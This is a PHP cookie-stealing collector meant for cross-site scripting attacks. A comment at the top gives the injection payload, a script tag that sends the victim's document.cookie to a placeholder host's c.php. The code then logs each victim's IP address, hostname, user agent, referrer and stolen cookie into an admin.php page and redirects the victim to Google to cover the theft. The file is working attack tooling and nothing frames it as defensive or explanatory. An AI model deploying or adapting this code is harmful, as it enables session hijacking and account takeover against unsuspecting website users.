<?php 
/*
Usage:
<script>location.href='http://xxxxxx.fr/c.php?c='+escape(document.cookie)</script> 
*/
	//copied from github and customized :
	function addToStealed($file, $ip, $host, $navigator, $date, $heure, $provenance, $data)
	{
		$tmp		= file($file);
		$newPage	= '';
		while($ligneActuelle = array_shift($tmp))
		{
			//if(preg_match("#<!-- Breakpoint -->#",$ligneActuelle)) //si on rencontre le breakpoint
			if($ligneActuelle == "<!-- Breakpoint -->\n") //si on rencontre le breakpoint
			{
				$newPage .= "<tr><td>$ip</td><td>$host</td><td>$navigator</td><td>$date</td><td>$heure</td><td>$provenance</td><td>$data</td></tr>";
				$newPage .= "\n<!-- Breakpoint -->\n";
			}
			else
				$newPage .= $ligneActuelle;
		}
		
		$monfichier = fopen($file, 'w');
		fseek($monfichier, 0);
		fputs($monfichier, $newPage);
	 
		fclose($monfichier);
	}
	
	$ip			= $_SERVER['REMOTE_ADDR'];
	$host		= gethostbyaddr($ip);
	$navigator	= $_SERVER['HTTP_USER_AGENT'];
	$date		= date("d/m/Y");
	$heure		= date("H:i:s");
	$provenance	= (!empty($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : 'Unspecified';
	if(isset($_GET['c']))	$data	= $_GET['c'];
	else 					$data	= 'No data';
	
	addToStealed("admin.php", $ip, $host, $navigator, $date, $heure, $provenance, $data);
	echo "Unauthorized Access"; header('location:http://google.com'); 
?>